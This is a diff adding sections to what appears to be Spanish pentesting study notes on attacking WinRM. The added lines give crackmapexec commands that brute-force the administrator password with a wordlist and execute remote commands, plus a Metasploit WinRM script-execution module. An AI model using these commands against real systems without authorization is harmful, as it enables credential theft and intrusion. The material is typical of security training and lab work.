@@ -15,6 +15,28 @@ WinRM también incluye **Windows Remote Shell (WinRS)**, que permite ejecutar co
 nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
 ```
 
+## Crackmapexec
+
+Nos sirve para obtener credenciales por fuerza bruta:
+
+```bash
+crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+O para ejecutar comandos
+
+```bash
+crackmapexec winrm 10.2.18.45 -u administrator -p <password> -x "command"
+```
+
+## [[metasploit]]
+
+```bash
+windows/winrm/winrm_script_exec
+
+set FORCE_VBS true
+```
+
 ## Conexión
 
 Si queremos verificar si uno o más servidores remotos son accesibles a través de WinRM, podemos hacerlo fácilmente con PowerShell utilizando el cmdlet *Test-WsMan*, pasando el nombre del host como parámetro. En entornos basados en Linux, podemos usar la herramienta [[evil-winrm]], diseñada para pruebas de penetración e interacción con WinRM.
